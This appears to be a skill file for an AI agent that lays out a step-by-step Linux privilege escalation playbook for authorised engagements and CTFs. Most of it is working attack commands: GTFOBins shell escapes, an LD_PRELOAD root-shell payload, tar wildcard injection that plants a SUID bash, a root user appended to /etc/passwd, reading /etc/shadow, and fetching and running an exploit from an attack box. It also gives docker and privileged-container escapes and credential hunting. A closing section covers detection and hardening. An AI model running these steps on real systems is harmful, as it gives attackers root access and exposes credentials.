---
name: privesc-linux
description: "Use when you hold a low-privilege Linux shell on an authorized engagement, lab, or CTF and need a reliable path to root. Covers LinPEAS-driven enumeration plus a manual checklist: sudo misconfigurations (sudo -l, NOPASSWD entries, LD_PRELOAD tricks), SUID and SGID binaries with GTFOBins techniques, Linux capabilities such as cap_setuid and cap_dac_read_search, cron wildcard injection and PATH hijacking, writable scripts and shared libraries, kernel version triage for public exploits, and container escapes through the docker socket, privileged mode, and CAP_SYS_ADMIN. Emphasizes verification before exploitation, noise awareness, and evidence capture for reports."
version: 1.0.0
domain: privesc
lifecycle: stable
last_verified: 2026-10-23
requires: []
extends: []
relates: [privesc-windows, linux-hardening]
tools:
  - name: linpeas
    version: 2.x
  - name: nmap
    version: 7.98
  - name: sudo
    version: 1.9.x
  - name: gcc
    version: 13.2.0
---
Linux privilege escalation turns a low-privilege foothold into root on systems you are authorized to test. Enumeration decides the outcome: most Linux privesc wins come from misconfigurations (sudo rules, SUID binaries, cron jobs, capabilities, writable files), not zero-days. This skill gives you an ordered workflow: stabilize the shell, enumerate automatically with LinPEAS, verify every finding by hand, exploit the quietest reliable path, and capture evidence for the report. Kernel exploits are the last resort because they can crash the target, so treat them with explicit warnings and prefer snapshots.

## Quick Workflow

1. Stabilize the shell and record the baseline: user, groups, kernel, distro, hostname, network position.
2. Run LinPEAS for broad automated enumeration and exfiltrate the output for local analysis.
3. Work the manual checklist in order: sudo, SUID/SGID, capabilities, cron, writable files, PATH, kernel version.
4. Verify each candidate by hand before touching it (read the sudoers entry, confirm writability, inspect the cron script).
5. Exploit the lowest-noise reliable path first: misconfiguration beats exploit code.
6. Confirm root, capture proof (id, hostname), and record exact commands for the report.
7. If the host is a container, pivot the checklist to container escapes (docker socket, privileged mode, mounted host paths).

## Phase 1: Orientation and automated enumeration

Get oriented first. A stable shell makes everything else faster.

```bash
whoami; id; uname -a; cat /etc/os-release; hostname
```

If the shell is fragile, upgrade it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then on your local terminal: Ctrl+Z, run `stty raw -echo; fg`, then on target `export TERM=xterm`.

Run LinPEAS and save the output. Never read thousands of lines inside a reverse shell; exfiltrate and grep locally.

```bash
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh
chmod +x /tmp/lp.sh
/tmp/lp.sh -a > /tmp/lp.out 2>&1
```

```bash
grep -iE "CVE|password|backup|shadow|\.sh$" /tmp/lp.out | head -40
```

The `-a` flag runs every check, which is slower and noisier. On a time-boxed test, run without `-a` first and escalate only if needed.

Manual sweep to run even when LinPEAS is blocked:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.d/; crontab -l 2>/dev/null
ls -la /opt /srv /home 2>/dev/null
env | sort; echo $PATH
```

## Phase 2: Sudo misconfigurations

`sudo -l` is the single highest-value command in Linux privesc. Read every line of its output.

```bash
sudo -l
sudo -n true
```

The second command tests passwordless sudo without triggering a password prompt. Look for:

- `(ALL) NOPASSWD: ALL`: game over. `sudo su -` or `sudo /bin/bash`.
- NOPASSWD on editors or pagers (vim, less, man, more, nano): they all have shell escapes.
- NOPASSWD on scripting languages (python3, perl, ruby, awk): direct root shell.
- NOPASSWD on a script or binary you can write to: edit it, or use it to read and write as root.
- `env_keep` including `LD_PRELOAD`: preload a malicious shared object.

Pager and editor escapes:

```bash
sudo less /etc/hosts
```

Inside less, type `!/bin/sh` to drop to a root shell. For vim:

```bash
sudo vim -c ':!/bin/sh'
```

LD_PRELOAD abuse when sudo preserves the variable:

```bash
cat > /tmp/p.c <<'EOF'
#include <unistd.h>
__attribute__((constructor)) void c(void){ setuid(0); setgid(0); system("/bin/bash"); }
EOF
gcc -fPIC -shared -o /tmp/p.so /tmp/p.c -nostartfiles
sudo LD_PRELOAD=/tmp/p.so /usr/bin/allowed-binary
```

Also check the sudo version itself for known CVEs (for example CVE-2021-3156 Baron Samedit affects sudo before 1.9.5p2):

```bash
sudo --version
```

## Phase 3: SUID and SGID binaries

List every SUID and SGID binary and compare against a known-good baseline. Anything custom or unusual is interesting.

```bash
find / -perm -4000 -type f 2>/dev/null | sort
find / -perm -2000 -type f 2>/dev/null | sort
```

Classic GTFOBins techniques for common SUID binaries:

```bash
find . -exec /bin/sh -p \; -quit
```

```bash
less /etc/hosts
```

Inside less, type `!/bin/sh`.

```bash
vim -c ':!/bin/sh'
bash -p
```

The `-p` flag matters: a SUID bash drops privileges unless `-p` keeps the effective UID. For old SUID nmap:

```bash
nmap --interactive
```

Then at the nmap prompt: `!sh`.

Beyond the binary itself, check what it loads and what it touches:

```bash
ldd /usr/bin/custom-suid
ls -la /usr/bin/custom-suid
strings /usr/bin/custom-suid | grep -iE "system\(|popen|/bin/sh|/tmp" | head
```

A writable shared library in its `ldd` output, or a `system()` call with a relative path, is an escalation path: plant your own library or binary earlier in the search order.

## Phase 4: Linux capabilities

Capabilities are finer-grained than SUID and easy to miss. Enumerate both the filesystem and the current process bounding set.

```bash
getcap -r / 2>/dev/null
capsh --print | head -30
```

High-value capabilities and their abuse:

- `cap_setuid+ep` on python3, perl, or ruby: become any UID, including root.

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

- `cap_dac_read_search+ep` or `cap_dac_override+ep`: bypass file permission checks. Read `/etc/shadow` directly or overwrite sensitive files.

```bash
python3 -c 'print(open("/etc/shadow").read())'
```

- `cap_sys_ptrace+ep`: attach to a root process with gdb and inject a shell.
- `cap_sys_admin+ep`: broad; often leads to a full container or host escape.

An empty `getcap` result is normal on hardened hosts. In containers, always check `capsh --print` too, because the container runtime may grant capabilities that no file carries.

## Phase 5: Cron jobs and scheduled tasks

Cron jobs running as root are a classic path. Enumerate every cron source, then for each root entry ask: is the script writable, is its directory writable, does it call relative binaries, does it use wildcards.

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /var/spool/cron/crontabs/ 2>/dev/null
crontab -l 2>/dev/null
systemctl list-timers --all 2>/dev/null
ps aux | grep -i cron
```

PATH hijacking: if a root cron script calls `tar` or another binary by relative name and you control an earlier PATH entry (or the script inherits a writable PATH), plant your own.

Wildcard injection: if root cron runs something like `tar cf /backups/home.tar *` inside a directory you can write to, tar interprets filenames as options.

```bash
cd /path/where/tar/runs
cat > shell.sh <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb
EOF
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

After cron fires, run `/tmp/rb -p` for a root shell. When debugging cron payloads, make the script log to a file you can read, because cron output otherwise goes nowhere visible:

```bash
* * * * * root /opt/job.sh >> /tmp/cron-debug.log 2>&1
```

Use absolute paths inside payloads: cron runs with a minimal environment and a bare PATH.

## Phase 6: Writable files, services, and NFS

Hunt for files root trusts but you can modify:

```bash
find / -xdev -type f -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | head -50
echo $PATH | tr ':' '\n' | xargs -I{} sh -c 'test -w "{}" 2>/dev/null && echo "WRITABLE: {}"'
ps auxf
ss -tlnp 2>/dev/null
ls -la /etc/systemd/system/ 2>/dev/null
```

High-value targets:

- Writable `/etc/passwd`: append a root user.

```bash
openssl passwd -1 'newpassword'
echo 'evil:$1$abcd$xxxxxxxxxxxxxxxxxxxxxx:0:0::/root:/bin/bash' >> /etc/passwd
su evil
```

- Writable service binary or systemd unit: modify it, then restart the service (or wait for reboot). Check `systemctl cat <service>` to see exactly what runs.
- Writable `/etc/ld.so.preload`: every new process loads your library as root. Rare, instantly fatal.
- NFS with `no_root_squash`: check `/etc/exports`. From your attack box, mount the share, drop a SUID-root binary, and run it on the target.

```bash
cat /etc/exports
showmount -e <target> 2>/dev/null
```

## Phase 7: Kernel and software exploits

Only reach for kernel exploits after misconfigurations are exhausted. Warning: a failed kernel exploit can panic the host and destroy the engagement. Use snapshots when you have them, compile on your attack box, and never run untrusted exploit code against production without explicit written approval.

```bash
uname -r; cat /etc/os-release
dpkg -l 2>/dev/null | grep -iE "linux-image|libc6|sudo|polkit" | head
```

On your attack box, match the exact kernel version (including the distro suffix) against public exploits:

```bash
searchsploit "linux kernel 5.4" | head -20
```

Compile for the target architecture and transfer the binary:

```bash
gcc -o exploit exploit.c -static
python3 -m http.server 8000
```

```bash
curl http://<attack-box>:8000/exploit -o /tmp/exploit && chmod +x /tmp/exploit
```

If the target has no compiler, static compilation on your box is the standard answer. Verify the exploit targets your exact version before running; nearby versions often fail or crash.

## Phase 8: Container escapes

Detect the container first, then pivot the whole checklist:

```bash
ls -la /.dockerenv 2>/dev/null
cat /proc/1/cgroup 2>/dev/null | head
capsh --print | grep -iE "cap_sys_admin|cap_dac"
ls -la /var/run/docker.sock 2>/dev/null
mount | grep -iE "docker|overlay"
```

Escape paths, quietest first:

- Docker socket mounted inside the container: talk to the host daemon.

```bash
docker run --rm -it -v /:/host alpine chroot /host bash
```

- Privileged container or CAP_SYS_ADMIN: mount the host disk directly.

```bash
fdisk -l 2>/dev/null | grep Disk
mkdir -p /tmp/m && mount /dev/sda1 /tmp/m
```

- Writable hostPath volume: write a cron job or an SSH authorized_keys file onto the host filesystem.
- The classic cgroup release_agent escape still works where CAP_SYS_ADMIN is present and cgroups v1 is mounted writable.
- Kernel exploits run against the shared host kernel, so a container on a vulnerable kernel is a host compromise.

Group membership shortcuts that are root-equivalent: the `docker` group and the `lxd`/`lxc` group. Check `id` early.

```bash
id | grep -E "docker|lxd"
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Edge cases

- LinPEAS output is huge: save to a file, exfiltrate it, and grep locally. Never page through thousands of lines in a reverse shell.
- `sudo -l` prompts for a password: try `sudo -n -l` (non-interactive) or test for a cached timestamp with `sudo -n true`.
- A SUID binary looks promising but has no GTFOBins entry: run `strings` and `ltrace` on it, especially custom in-house binaries, which are often the intended path.
- Your cron payload never fires: cron has a minimal environment, so use absolute paths everywhere and add logging (`>> /tmp/debug.log 2>&1`) to see what actually happened.
- No compiler on target: compile statically on your attack box for the right architecture, or rewrite the exploit in a language already installed (python3, perl).
- Capabilities look empty but you are in a container: check `capsh --print`, the runtime may grant capabilities no file carries.
- An exploit works in the lab but crashes the target: kernel build options (SMEP, SMAP, KASLR) differ. Match `uname -r` exactly, including the distro suffix, and treat each run as potentially destructive.

## Escalation

- Enumeration finds nothing: pivot to localhost-only network services (`ss -tlnp`) and port-forward them. Databases, debug ports, and admin panels bound to 127.0.0.1 are common second footholds.
- You have a writable script but no trigger: check logrotate configs, package maintainer scripts, login hooks (`.bashrc`, motd scripts), and backup jobs run by admins on a schedule.
- Stuck as a service user like www-data: read web application configs for database and cloud credentials, then test password reuse with `su`. Users reuse passwords constantly.
- Kernel path fails: re-sweep misconfigurations with fresh eyes, especially NFS exports, LXD group membership, and docker group membership.
- Nothing local works: check for credentials in shell history, config files, and environment variables (`env`, `/proc/*/environ` where readable). One reused password often beats every exploit.

## Detection and defender view

- Sudo logs every invocation to the auth log. Unexpected `sudo -l` probing and first-time NOPASSWD use stand out clearly.
- New SUID binaries and mode changes are caught by file integrity monitoring (AIDE, Wazuh FIM, osquery file table).
- Cron persistence shows in `/etc/cron.d` and systemd timers. Auditd rules on cron directories and on `crontab` execution catch it.
- LD_PRELOAD attacks leave the `.so` on disk and appear in process environments. Auditd execve logging catches the compiler invocations that build them.
- Container escapes through the docker socket are visible in the Docker daemon audit log. Privileged containers should never exist in production.
- Defenders shrink this entire attack class with a minimal SUID footprint, no NOPASSWD rules, read-only cron directories, dropped capabilities, user namespaces, and patched kernels. See linux-hardening for the full checklist.

## Key references

- MITRE ATT&CK: T1068 (Exploitation for Privilege Escalation), T1548.001 (Setuid and Setgid), T1548.003 (Sudo and Sudo Caching), T1053.003 (Cron), T1574 (Hijack Execution Flow), T1611 (Escape to Host), T1552.001 (Credentials In Files), T1037 (Boot or Logon Initialization Scripts).
- CWE: CWE-269 (Improper Privilege Management), CWE-250 (Execution with Unnecessary Privileges), CWE-732 (Incorrect Permission Assignment for Critical Resource), CWE-426 (Untrusted Search Path), CWE-427 (Uncontrolled Search Path Element), CWE-367 (Time-of-check Time-of-use Race Condition), CWE-798 (Use of Hard-coded Credentials), CWE-59 (Improper Link Resolution Before File Access).
- Tool docs: PEASS-ng LinPEAS (github.com/peass-ng/PEASS-ng), GTFOBins (gtfobins.github.io).
